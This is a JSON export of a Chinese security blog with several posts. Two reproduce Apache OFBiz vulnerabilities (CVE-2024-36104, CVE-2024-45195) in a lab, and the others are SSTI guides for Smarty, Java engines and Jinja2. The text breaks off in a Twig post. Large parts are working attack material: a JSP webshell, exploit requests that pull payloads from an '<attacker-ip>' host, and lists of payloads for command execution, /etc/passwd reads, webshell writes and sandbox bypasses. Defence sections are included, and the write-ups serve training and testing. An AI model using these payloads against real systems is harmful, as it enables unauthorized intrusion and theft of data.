{"meta":{"title":"isum","subtitle":"","description":"","author":"isum","url":"https://ehzisum.github.io","root":"/"},"pages":[{"title":"关于页","date":"2024-04-26T23:27:22.000Z","updated":"2024-11-29T07:11:30.823Z","comments":true,"path":"about/index.html","permalink":"https://ehzisum.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"春秋云镜-Apache OFBiz历史漏洞","slug":"春秋云镜-Apache-OFBiz历史漏洞","date":"2025-05-06T10:19:22.000Z","updated":"2025-05-06T10:23:42.134Z","comments":true,"path":"2025/05/06/春秋云镜-Apache-OFBiz历史漏洞/","link":"","permalink":"https://ehzisum.github.io/2025/05/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Apache-OFBiz%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"CVE-2024-36104✓CVE-2024-32113✓CVE-2024-38856✓ ​​CVE编号​​ ​​漏洞类型​​ ​​利用方式​​ ​​影响版本​​ ​​修复版本​​ ​​关键区别​​ ​​CVE-2024-32113​​ 路径遍历 → RCE 通过特殊字符（如;）绕过路径校验，访问受限接口 旧版本（未明确） 18.12.14+ ​​利用字符解析缺陷​​，非标准路径遍历 ​​CVE-2024-36104​​ 路径遍历 → RCE 构造 /forgotPassword/%2e%2e/ProgramExport 路径绕过认证 &lt; 18.12.14 18.12.14+ ​​路径遍历技巧不同​​，但最终触发点相同 ​​CVE-2024-38856​​ 认证绕过 → RCE 通过 /forgotPassword 绕过权限，调用 ProgramExport 执行Groovy代码 &lt; 18.12.14 18.12.14+ ​​直接利用Groovy接口​​，无需文件写入 ​​CVE-2024-45195​​ SSRF → 文件写入 → RCE 通过 viewdatafile 接口远程加载恶意CSV&#x2F;XML，写入JSP木马 &lt; 18.12.16 18.12.16+ ​​需文件写入+Web目录访问​​，利用链更长 CVE-2024-451951、概述该漏洞是由于之前漏洞（CVE-2024-32113、CVE-2024-36104 和 CVE-2024-38856）未完全修复所导致。在 Apache OFBiz 版本 18.12.16 之前，开发人员对这些先前的问题进行了修复，但控制器视图地图状态不同步的根本问题仍然存在。这使得攻击者能够绕过身份验证并访问敏感的仅限管理员的视图地图。 影响范围​​： Apache OFBiz 版本 &lt; 18.12.16 涉及功能模块：/webtools/control/viewdatafile 接口 2、分析漏洞成因​​： ​​权限绕过​​： Apache OFBiz 在处理 /viewdatafile 接口时，未对请求路径进行严格的权限校验。攻击者可通过构造包含 /forgotPassword 等公开接口的 URL（如 /webtools/control/forgotPassword/viewdatafile），绕过身份验证机制 ​​文件写入逻辑缺陷​​： 该接口允许通过参数 DATAFILE_SAVE 指定文件保存路径，并通过 DATAFILE_LOCATION 和 DEFINITION_LOCATION 远程加载恶意 CSV&#x2F;JSP 和 XML 配置文件。攻击者可利用此功能将木马写入 Web 目录（如 ./applications/accounting/webapp/accounting/index.jsp） ​​动态脚本执行​​： 写入的 JSP 文件会被 Apache Tomcat 解析，攻击者通过 URL 参数（如 ?cmd=calc）触发命令执行 3、复现(1)、在服务器 &lt;attacker-ip&gt; 上部署恶意 XML 文件和 CSV 文件 第一个文件是 rceschema.xml，此 XML schema 文件定义了恶意 JSP 的结构： &lt;data-files xsi:noNamespaceSchemaLocation=&quot;http://ofbiz.apache.org/dtds/datafiles.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt; &lt;data-file name=&quot;rce&quot; separator-style=&quot;fixed-length&quot; type-code=&quot;text&quot; start-line=&quot;0&quot; encoding-type=&quot;UTF-8&quot;&gt; &lt;record name=&quot;rceentry&quot; limit=&quot;many&quot;&gt; &lt;field name=&quot;jsp&quot; type=&quot;String&quot; length=&quot;605&quot; position=&quot;0&quot;&gt;&lt;/field&gt; &lt;/record&gt; &lt;/data-file&gt; &lt;/data-files&gt; 第二个文件是 rcereport.csv，此 CSV 文件包含实际的 JSP 代码： &lt;%@ page import=&#39;java.io.*&#39; %&gt;&lt;%@ page import=&#39;java.util.*&#39; %&gt;&lt;h1&gt;Ahoy!&lt;/h1&gt;&lt;br&gt;&lt;% String getcmd = request.getParameter(&quot;cmd&quot;); if (getcmd != null) &#123; out.println(&quot;Command: &quot; + getcmd + &quot;&lt;br&gt;&quot;); String cmd1 = &quot;/bin/sh&quot;; String cmd2 = &quot;-c&quot;; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine();&#125;&#125; %&gt;, 启动Python内置HTTP服务器 # 进入文件所在目录 cd /path/to/files # 启动Python HTTP服务（默认端口8000） python3 -m http.server 8000 sudo ufw allow 8000/tcp (2)、发送请求该请求通过利用 viewdatafile 视图地图将恶意 JSP 文件写入 Web 根目录，从而利用了该漏洞实现远程代码执行。 POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1 Host: localhost:34583 User-Agent: curl/7.81.0 Accept: */* Content-Length: 241 Content-Type: application/x-www-form-urlencoded DATAFILE_LOCATION=http://&lt;attacker-ip&gt;/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&amp;DATAFILE_IS_URL=true&amp;DEFINITION_LOCATION=http://&lt;attacker-ip&gt;/rceschema.xml&amp;DEFINITION_IS_URL=true&amp;DEFINITION_NAME=rce (3)、执行任意命令在 JSP webshell 被写入后，通过 &#96;https://39.106.48.123:34583/accounting/index.jsp?cmd=cat &#x2F;flag 4、修复官方修复的核心改动​： ​(1) 权限校验强化​ ​​问题根源​​：原漏洞利用路径 /webtools/control/forgotPassword/viewdatafile 通过嵌套公开接口（forgotPassword）绕过权限检查。 ​​修复方式​​： 在 ControlFilter.java 中修改请求路由逻辑，​​强制要求精确匹配控制器定义的接口路径​​，禁止通过路径遍历（如 /forgotPassword/../viewdatafile）访问受限接口。 // 修复前：松散匹配路径 if (requestUri.contains(&quot;viewdatafile&quot;)) &#123; /* 执行逻辑 */ &#125; // 修复后：严格校验完整路径 if (requestUri.equals(&quot;/webtools/control/viewdatafile&quot;)) &#123; /* 执行逻辑 */ &#125; ​(2) 文件写入限制​​ ​​问题根源​​：viewdatafile 接口允许通过 DATAFILE_LOCATION 参数加载远程文件并写入任意路径。 ​​修复方式​​： 移除通过 URL 加载外部文件的功能（DATAFILE_IS_URL 和 DEFINITION_IS_URL 参数失效）。 限制文件保存路径必须在安全目录内（如临时目录），禁止写入 Web 根目录。 // 修复后代码片段（FileUtil.java） if (savePath.contains(&quot;webapp&quot;)) &#123; throw new SecurityException(&quot;禁止写入Web目录&quot;); &#125; ​(3) 输入参数过滤​​ ​​问题根源​​：未对 DATAFILE_SAVE 和 DEFINITION_LOCATION 参数进行过滤。 ​​修复方式​​： 增加对参数内容的黑名单校验，禁止包含 ../、WEB-INF、webapp 等敏感路径： if (parameterValue.matches(&quot;.*(\\\\.\\\\./|WEB-INF|webapp).*&quot;)) &#123; throw new SecurityException(&quot;非法路径参数&quot;); &#125;","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://ehzisum.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"groovy","slug":"groovy","permalink":"https://ehzisum.github.io/tags/groovy/"},{"name":"路径处理","slug":"路径处理","permalink":"https://ehzisum.github.io/tags/%E8%B7%AF%E5%BE%84%E5%A4%84%E7%90%86/"}]},{"title":"春秋云镜-Apache OFBiz路径遍历漏洞（CVE-2024-36104）","slug":"春秋云镜-Apache-OFBiz路径遍历漏洞（CVE-2024-36104）","date":"2025-05-05T14:19:14.000Z","updated":"2025-05-05T23:55:14.208Z","comments":true,"path":"2025/05/05/春秋云镜-Apache-OFBiz路径遍历漏洞（CVE-2024-36104）/","link":"","permalink":"https://ehzisum.github.io/2025/05/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Apache-OFBiz%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-36104%EF%BC%89/","excerpt":"","text":"漏洞概述Apache OFBiz是一款基于Java的企业资源计划（ERP）系统，广泛应用于电子商务领域。2024年6月披露的CVE-2024-36104漏洞允许攻击者通过路径遍历绕过身份验证，并利用Groovy脚本执行接口实现​远程代码执行（RCE）​。该漏洞影响Apache OFBiz 18.12.14之前的版本 漏洞影响版本 ​​受影响版本​​：Apache OFBiz &lt; 18.12.14 ​​FOFA搜索语法​​：app=&quot;Apache_OFBiz&quot; 漏洞原理分析Apache OFBiz的​​请求路由机制设计缺陷​​ 1. ​OFBiz的请求路由逻辑​​Apache OFBiz使用ControlServlet和ControlFilter处理请求路径，其路由规则如下： 默认情况下，请求路径会被解析为：/webtools/control/&lt;endpoint&gt;，其中&lt;endpoint&gt;对应controller.xml中定义的接口。 关键问题​：OFBiz的路径解析逻辑​​未严格校验路径层级​​，导致以下两种请求会被视为等效： 合法路径：/webtools/control/ProgramExport 嵌套路径：/webtools/control/forgotPassword/ProgramExport 2. ​漏洞触发的根本原因​​（1）​​接口权限控制失效​​ forgotPassword是公开接口（无需认证），而ProgramExport是需认证的高危接口。 由于路由逻辑缺陷，当用户访问/forgotPassword/ProgramExport时： ​​权限检查​​：系统首先检查forgotPassword的权限（允许访问）。 ​​路由映射​​：后续路径ProgramExport被错误地当作子接口处理，绕过了对ProgramExport本身的权限校验。 （2）​​路径遍历的“简化版”​​ 漏洞利用中使用的%2e（.的URL编码）是显式的路径遍历（/forgotPassword/%2e/%2e/ProgramExport等价于/ProgramExport）。 &#x2F;webtools&#x2F;control&#x2F;forgotPassword;&#x2F;ProgramExport 但直接访问/forgotPassword/ProgramExport能成功，是因为OFBiz的​​路由逻辑自动忽略了中间路径​​，本质上与路径遍历效果相同。 3.​官方修复方式验证​​在Apache OFBiz 18.12.14版本中，官方通过以下方式修复： ​​严格路径校验​​：要求请求路径必须精确匹配controller.xml中定义的接口，禁止多级路径嵌套。 ​​显式权限控制​​：对ProgramExport等敏感接口强制二次鉴权。 漏洞复现步骤1、访问https://ip:8443/accounting非本地 localhost 启动，修改请求体Host为localhost才能正常访问 2、请求&#x2F;webtools&#x2F;control&#x2F;forgotPassword&#x2F;ProgramExport接口，执行代码 -- groovy throw new Exception(&#39;cat /flag&#39;.execute().text); -- unicode \\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b POST /webtools/control/forgotPassword/ProgramExport HTTP/1.1 Host: localhost:36646 Cookie: JSESSIONID=2A2143A74051B80F86479CE4543B034E.jvm1; OFBiz.Visitor=10000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OpenWave/93.4.3797.32 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Sec-Ch-Ua-Platform: &quot;Windows&quot; Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot; Sec-Ch-Ua-Mobile: ?0 Priority: u=0, i Te: trailers Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 306 groovyProgram=\\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b 修复建议 ​​官方补丁​​：升级至Apache OFBiz 18.12.14或更高版本 ​​临时缓解措施​​： 禁用webtools模块的非必要接口。 配置Web应用防火墙（WAF）拦截包含%2e或;的恶意请求。 ​​输入过滤​​：对groovyProgram参数实施白名单校验，禁止异常字符。 总结CVE-2024-36104暴露了Apache OFBiz在路径处理和接口权限设计上的严重缺陷。通过本次复现可看出，攻击者仅需构造简单请求即可实现未授权RCE，威胁等级极高。企业需及时修复漏洞，并加强对外部组件的安全审计。","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://ehzisum.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"groovy","slug":"groovy","permalink":"https://ehzisum.github.io/tags/groovy/"},{"name":"路径处理","slug":"路径处理","permalink":"https://ehzisum.github.io/tags/%E8%B7%AF%E5%BE%84%E5%A4%84%E7%90%86/"}]},{"title":"SSTI-php模板引擎Smarty注入全面指南","slug":"SSTI-php模板引擎Smarty注入全面指南","date":"2025-03-24T01:12:27.000Z","updated":"2025-03-24T01:12:53.845Z","comments":true,"path":"2025/03/24/SSTI-php模板引擎Smarty注入全面指南/","link":"","permalink":"https://ehzisum.github.io/2025/03/24/SSTI-php%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8ESmarty%E6%B3%A8%E5%85%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97/","excerpt":"","text":"一、基础知识1. Smarty简介• 模板引擎：用于PHP的编译型模板引擎，将模板转化为PHP脚本执行。• 语法标签：默认使用&#123; &#125;，可自定义（如&#123;&#123; &#125;&#125;）。• 执行模式： • 非沙盒模式：默认，允许执行PHP函数及Smarty内置方法。 • 沙盒模式：限制危险函数，需手动开启（$smarty-&gt;enableSecurity(&#39;sandbox&#39;);）。 2. 开发中的代码实例正常使用示例以下代码展示Smarty的典型安全用法，用户输入经过过滤后输出： // PHP控制器逻辑 require_once &#39;Smarty.class.php&#39;; $smarty = new Smarty(); $username = htmlspecialchars($_GET[&#39;name&#39;]); // 输入过滤 $smarty-&gt;assign(&#39;name&#39;, $username); $smarty-&gt;display(&#39;user_profile.tpl&#39;); // user_profile.tpl 模板内容 &lt;h1&gt;Welcome, &#123;$name&#125;!&lt;/h1&gt; &lt;!-- 安全输出 --&gt; 有漏洞的代码示例// PHP控制器逻辑（危险操作！） $smarty = new Smarty(); $user_input = $_GET[&#39;content&#39;]; // 未过滤直接使用 $smarty-&gt;assign(&#39;content&#39;, $user_input); $smarty-&gt;display(&#39;blog_post.tpl&#39;); // blog_post.tpl 模板内容 &#123;* 直接嵌入用户输入 *&#125; &lt;div class=&quot;content&quot;&gt;&#123;$content&#125;&lt;/div&gt; 3. 注入原理用户输入未经处理直接拼接到模板中，攻击者通过闭合标签注入恶意代码。 二、渗透关键点1. 检测注入点• 输入点：URL参数、Cookie、Headers等可控参数。• 检测方法： GET /page?param=&#123;7 * 7&#125; HTTP/1.1 观察响应中是否返回49，或通过报错信息识别引擎类型。 2. 判断版本与模式• 版本获取：触发错误（如&#123;invalid&#125;）查看版本信息。• 沙盒检测：尝试执行&#123;system(&#39;id&#39;)&#125;，失败则可能处于沙盒模式。 三、漏洞利用与Payload1. 非沙盒模式利用命令执行&#123;system(&#39;id&#39;)&#125; &#123;exec(&#39;cat /etc/passwd&#39;)&#125; &#123;shell_exec(&#39;whoami&#39;)&#125; 文件读取（旧版本）&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125; # CVE-2017-1000480 # php中&#39;-&gt;&#39;访问对象的属性和方法，&#39;::&#39;访问类的静态成员或常量 写Webshell&#123;Smarty_Internal_Write_File::writeFile(&#39;/path/shell.php&#39;, &#39;&lt;?php phpinfo(); ?&gt;&#39;)&#125; 2. 沙盒绕过技巧利用静态方法（CVE-2021-26119）&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#39;string:&#123;system(&quot;id&quot;)&#125;&#39;)&#125; 字符串拼接&#123;assign var=&#39;cmd&#39; value=&#39;sy&#39;|cat:&#39;stem&#39;&#125;&#123;$cmd(&#39;id&#39;)&#125; math标签执行代码&#123;math equation=&#39;exec(&quot;id&quot;)&#39;&#125; fetch读取文件&#123;fetch file=&quot;/etc/passwd&quot;&#125; 3. 其他Payload• XSS利用：&#123;literal&#125;&lt;script&gt;alert(1)&lt;/script&gt;&#123;/literal&#125;• 信息泄露：&#123;$smarty.version&#125; 四、防御手段1. 官方推荐• 开启沙盒模式：限制敏感函数调用。• 过滤输入：避免用户输入直接嵌入模板。• 禁用危险函数：移除system、exec等函数。 2. 安全配置• 更新至最新版本（≥3.1.36，≥4.0.2）。• 避免使用&#123;$smarty.get.*&#125;直接接收参数。• 配置$smarty-&gt;security_policy限制文件访问。 五、绕过技巧1. 编码混淆&#123;assign var=&#39;cmd&#39; value=&#39;s\\171stem&#39;&#125;&#123;$cmd|replace:&#39;\\\\&#39;:&#39;&#39;,&#39;y&#39;:&#39;s&#39;&#125;(id) 2. 利用&#123;literal&#125;标签&#123;literal&#125;&#123;/literal&#125;&#123;system(&#39;id&#39;)&#125;&#123;literal&#125;&#123;/literal&#125; 3. 动态调用&#123;assign var=&#39;func&#39; value=&#39;sys&#39;.&#39;tem&#39;&#125;&#123;$func(&#39;id&#39;)&#125; 4. 文件包含&#123;include file=&#39;php://filter/convert.base64-encode/resource=/etc/passwd&#39;&#125; 六、总结与参考1. 测试流程 检测注入点 → 2. 判断执行模式 → 3. 尝试基础Payload → 4. 沙盒绕过 → 5. 提权或横向移动 2. 注意事项• 避免对生产环境造成破坏。• 关注Smarty版本更新与CVE公告。 3. 参考资源• Smarty官方文档• CVE-2017-1000480• OWASP SSTI备忘单 备注：实际渗透中需结合目标环境调整Payload，关注上下文过滤规则及WAF拦截情况。","categories":[{"name":"ctf","slug":"ctf","permalink":"https://ehzisum.github.io/categories/ctf/"}],"tags":[{"name":"ssti","slug":"ssti","permalink":"https://ehzisum.github.io/tags/ssti/"}]},{"title":"SSTI-Java模板注入全面指南","slug":"SSTI-Java模板注入全面指南","date":"2025-03-24T01:03:16.000Z","updated":"2025-03-24T01:03:36.302Z","comments":true,"path":"2025/03/24/SSTI-Java模板注入全面指南/","link":"","permalink":"https://ehzisum.github.io/2025/03/24/SSTI-Java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97/","excerpt":"","text":"一、基础知识1. Java常见模板引擎• FreeMarker：广泛用于企业级应用，语法为$&#123;expression&#125;。• Thymeleaf：Spring生态主流模板引擎，语法为[[$&#123;expression&#125;]]。• Velocity：Apache项目，语法为$variable和#directive。• **JSP (JSTL)**：传统Java模板，支持表达式语言（EL）如$&#123;expression&#125;。 2. 开发中的代码实例漏洞代码示例（FreeMarker）// 危险操作：直接渲染用户输入 String userInput = request.getParameter(&quot;content&quot;); Configuration cfg = new Configuration(Configuration.VERSION_2_3_31); Template template = new Template(&quot;injected&quot;, new StringReader(userInput), cfg); StringWriter output = new StringWriter(); template.process(null, output); // 导致SSTI 漏洞代码示例（Thymeleaf）// 危险操作：用户输入作为模板片段 String input = request.getParameter(&quot;param&quot;); Context context = new Context(); context.setVariable(&quot;param&quot;, input); String result = templateEngine.process(input, context); // 直接渲染用户输入 二、渗透关键点1. 检测注入点• 输入点：URL参数、模板动态拼接内容。• 检测方法： GET /page?param=$&#123;7 * 7&#125; HTTP/1.1 &lt;!-- FreeMarker/Velocity/JSP EL --&gt; GET /page?param=[[$&#123;7 * 7&#125;]] HTTP/1.1 &lt;!-- Thymeleaf --&gt; 观察响应中是否返回49。 2. 引擎识别• FreeMarker：报错信息包含FreeMarker template error。• Thymeleaf：报错信息包含Thymeleaf或TemplateProcessingException。• Velocity：报错信息包含Velocity或ParseException。 三、漏洞利用与Payload1. FreeMarker注入命令执行（需new指令未禁用）&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125; 文件读取&lt;#assign file = &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.File&quot;,&quot;/etc/passwd&quot;)&gt; &lt;#assign is = &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.FileInputStream&quot;, file)&gt; &lt;#assign br = &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.BufferedReader&quot;, &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.InputStreamReader&quot;, is))&gt; &lt;#list 1..1000 as _&gt; $&#123; br.readLine()! &#125; &lt;/#list&gt; 2. Thymeleaf注入预处理表达式（高危）// 用户输入为：__$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)&#125;__::.x [[$&#123;param&#125;]] // 渲染时触发命令执行 表达式语言（EL）利用$&#123;T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#125; &lt;!-- 需要启用表达式预处理 --&gt; 3. Velocity注入命令执行#set($exec = $util.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null)) $exec.exec(&quot;id&quot;) 文件读取#set($reader = $util.getClass().forName(&quot;java.io.FileReader&quot;).newInstance(&quot;/etc/passwd&quot;)) #set($buf = $util.getClass().forName(&quot;java.io.BufferedReader&quot;).newInstance($reader)) #foreach($i in [1..1000]) $buf.readLine() #end 4. JSP（JSTL）EL注入命令执行（旧版EL）$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;id&quot;))&#125; 文件读取$&#123;&#39;&#39;.getClass().forName(&#39;java.io.BufferedReader&#39;).newInstance(&#39;&#39;.getClass().forName(&#39;java.io.FileReader&#39;).newInstance(&#39;/etc/passwd&#39;)).readLine()&#125; 四、防御手段1. 通用防御• 输入过滤：禁止用户输入直接嵌入模板逻辑。• 沙盒模式： • FreeMarker：配置new_builtin_class_resolver限制类访问。 • Velocity：启用SecureUberspector限制反射。 • Thymeleaf：禁用预处理表达式（spring.thymeleaf.mode=HTML）。 2. 安全配置• FreeMarker： cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER); • Thymeleaf：避免使用@&#123;&#125;动态拼接模板路径。• JSP：禁用EL表达式（&lt;%@ page isELIgnored=&quot;true&quot; %&gt;）。 五、绕过技巧1. 编码混淆$&#123;&#39;&#39;[&#39;cl&#39;+&#39;ass&#39;].forName(&#39;java.la&#39;+&#39;ng.Run&#39;+&#39;time&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,&#39;&#39;.getClass()).invoke(&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Run&#39;+&#39;time&#39;).getMethod(&#39;getRun&#39;+&#39;time&#39;).invoke(null),&#39;id&#39;)&#125; 2. 字符串拼接#set($cmd = &quot;j&quot;) #set($cmd = $cmd + &quot;ava.lang.Run&quot;) $cmd.getRuntime().exec(&quot;id&quot;) 3. 反射链调用&lt;#assign rt = &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.lang.Runtime&quot;)&gt; &lt;#assign method = rt?api.class.getMethod(&quot;getRuntime&quot;)&gt; $&#123;method.invoke(null)?api.exec(&quot;id&quot;)&#125; 六、总结与参考1. 测试流程 检测注入点 → 2. 识别引擎类型 → 3. 构造反射链 → 4. 执行命令&#x2F;读取文件 2. 高危CVE• CVE-2021-21346：Thymeleaf预处理表达式注入（影响版本&lt;3.0.12）。• CVE-2020-13952：Apache Velocity远程代码执行（影响版本&lt;2.2）。 3. 参考资源• FreeMarker安全指南• Thymeleaf预处理漏洞分析• JSP EL注入研究 备注：Java模板注入通常需要构造反射链或利用特定引擎的指令，渗透测试时需结合目标引擎版本调整Payload。重点关注Runtime.getRuntime().exec()和文件读写操作。","categories":[{"name":"ctf","slug":"ctf","permalink":"https://ehzisum.github.io/categories/ctf/"}],"tags":[{"name":"ssti","slug":"ssti","permalink":"https://ehzisum.github.io/tags/ssti/"}]},{"title":"SSTI-python模板引擎Jinja2注入全面指南","slug":"SSTI-python模板引擎Jinja2注入全面指南","date":"2025-03-24T01:02:31.000Z","updated":"2025-03-24T01:25:43.219Z","comments":true,"path":"2025/03/24/SSTI-python模板引擎Jinja2注入全面指南/","link":"","permalink":"https://ehzisum.github.io/2025/03/24/SSTI-python%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8EJinja2%E6%B3%A8%E5%85%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97/","excerpt":"","text":"一、基础知识1. Jinja2简介• 模板引擎：Python的主流模板引擎，广泛用于Flask、Django等框架。• 语法标签： • 变量输出：&#123;&#123; variable &#125;&#125; • 逻辑控制：&#123;% if condition %&#125;...&#123;% endif %&#125; • 注释：• 沙盒机制：默认禁用危险操作（如文件读写），但可通过继承链绕过。 2. 开发中的代码实例正常使用示例（安全）from jinja2 import Environment, FileSystemLoader env = Environment(loader=FileSystemLoader(&#39;templates&#39;)) template = env.get_template(&#39;index.html&#39;) name = request.args.get(&#39;name&#39;, &#39;Guest&#39;) output = template.render(name=name) # 安全渲染 有漏洞的代码示例（危险！）from jinja2 import Template user_input = request.args.get(&#39;content&#39;) template = Template(user_input) # 直接渲染用户输入 output = template.render() 二、渗透关键点1. 检测注入点• 输入点：URL参数、Cookie、动态模板内容。• 检测方法： GET /page?param=&#123;&#123;7 * 7&#125;&#125; HTTP/1.1 2. 沙盒状态判断• 默认沙盒：Jinja2默认限制文件读写和危险函数。• 沙盒绕过标志：尝试访问敏感属性（如__class__），成功则沙盒未启用。 三、漏洞利用与Payload1. 基础利用（Python对象操作）执行命令&#123;&#123; self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() &#125;&#125; 文件读取&#123;&#123; self.__init__.__globals__.__builtins__.open('/etc/passwd').read() &#125;&#125; 2. 类继承链攻击通过__mro__访问危险类&#123;&#123; ''.__class__.__mro__[1].__subclasses__() &#125;&#125; &lt;!-- 列出所有子类 --&gt; 查找可用的危险类（如subprocess.Popen）： &#123;&#123; ''.__class__.__mro__[1].__subclasses__()[413]('id', shell=True, stdout=-1).communicate() &#125;&#125; 3. 绕过沙盒的快捷方式使用__dict__访问模块&#123;&#123; config.__class__.__init__.__globals__['os'].popen('id').read() &#125;&#125; 利用内置cycler或joiner（Flask特定）&#123;&#123; cycler.__init__.__globals__.os.system('id') &#125;&#125; 4. 其他Payload• 信息泄露： &#123;&#123; config &#125;&#125; &lt;!-- 泄露Flask配置 --&gt; &#123;&#123; request.environ &#125;&#125; &lt;!-- 泄露环境变量 --&gt; • XSS利用： &#123;&#123; 'alert(1)' | safe &#125;&#125; &lt;!-- 需关闭自动转义 --&gt; 四、防御手段1. 官方推荐• 避免渲染用户输入：禁止动态拼接模板内容。• 启用严格沙盒： from jinja2.sandbox import SandboxedEnvironment env = SandboxedEnvironment() 2. 安全配置• 更新至最新版本（≥Jinja2 3.x）。• 使用白名单限制模板可访问的属性和方法。• 在Flask中禁用调试模式（app.debug = False）。 五、绕过技巧1. 字符串拼接&#123;&#123; self[\"__init__\"][\"__globals__\"][\"__builtins__\"][\"__import__\"](\"os\").popen(\"id\").read() &#125;&#125; 2. 利用过滤器&#123;&#123; \"id\" | map(\"system\") &#125;&#125; 3. 全局函数注入&#123;&#123; lipsum.__globals__.os.popen(\"id\").read() &#125;&#125; 4. 属性链展开&#123;&#123; (()|select|string|list).__class__.__mro__[1].__subclasses__()[413]('id',shell=True) &#125;&#125; 六、总结与参考1. 测试流程 检测注入点 → 2. 访问__class__验证沙盒 → 3. 构造继承链 → 4. 执行命令&#x2F;读取文件 2. 高危CVE• CVE-2019-8341：Jinja2沙盒绕过漏洞（影响版本&lt;2.10.1）。• CVE-2022-2333：Flask调试模式RCE（需结合Jinja2）。 3. 参考资源• Jinja2官方文档• SSTI Payload生成工具• Jinja2沙盒绕过研究 备注：Jinja2的沙盒限制较为严格，但通过对象继承链仍可实现绕过。渗透测试时需优先验证__class__等魔术方法的可访问性，并关注目标框架（如Flask）的特定漏洞。","categories":[{"name":"ctf","slug":"ctf","permalink":"https://ehzisum.github.io/categories/ctf/"}],"tags":[{"name":"ssti","slug":"ssti","permalink":"https://ehzisum.github.io/tags/ssti/"}]},{"title":"SSTI-php模板引擎Twig注入全面指南","slug":"SSTI-php模板引擎Twig注入全面指南","date":"2025-03-24T01:01:02.000Z","updated":"2025-03-24T01:25:52.929Z","comments":true,"path":"2025/03/24/SSTI-php模板引擎Twig注入全面指南/","link":"","permalink":"https://ehzisum.github.io/2025/03/24/SSTI-php%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8ETwig%E6%B3%A8%E5%85%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97/","excerpt":"","text":"一、基础知识1. Twig简介• 模板引擎：PHP的现代模板引擎，广泛用于Symfony框架。• 语法标签： • 变量输出：&#123;&#123; variable &#125;&#125; • 逻辑控制：&#123;% if condition %&#125;...&#123;% endif %&#125; • 注释：• 沙盒模式：默认禁用危险函数（如system），但需手动启用完整沙盒限制。 2. 